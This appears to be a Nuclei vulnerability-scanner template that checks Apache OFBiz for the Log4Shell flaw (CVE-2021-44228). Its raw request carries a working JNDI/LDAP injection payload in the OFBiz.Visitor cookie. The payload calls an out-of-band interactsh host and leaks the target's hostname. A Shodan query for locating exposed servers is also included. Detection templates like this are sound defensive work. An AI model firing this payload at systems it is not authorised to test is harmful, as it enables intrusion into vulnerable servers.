http:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'GET /webtools/control/main HTTP/1.1

    Host: {{Hostname}}

    Cookie: OFBiz.Visitor=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.cookie.{{interactsh-url}}}

    '
id: apache-ofbiz-log4j-rce
info:
  author: pdteam
  classification:
    cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'Apache OFBiz is affected by a remote code execution vulnerability
    in the bundled Apache Log4j logging library. Apache Log4j is vulnerable due to
    insufficient protections on message lookup substitutions when dealing with user
    controlled input. A remote, unauthenticated attacker can exploit this, via a web
    request, to execute arbitrary code with the permission level of the running Java
    process.

    '
  metadata:
    max-request: 1
    product: ofbiz
    shodan-query: http.html:"Apache OFBiz"
    vendor: apache
  name: Apache OFBiz - JNDI Remote Code Execution (Apache Log4j)
  reference:
  - https://issues.apache.org/jira/browse/OFBIZ-12449
  - https://ofbiz.apache.org/
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  remediation: Upgrade to Apache OFBiz version 8.12.03 or later.
  severity: critical
  tags: cve,cve2021,ofbiz,oast,log4j,rce,apache,jndi,kev,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
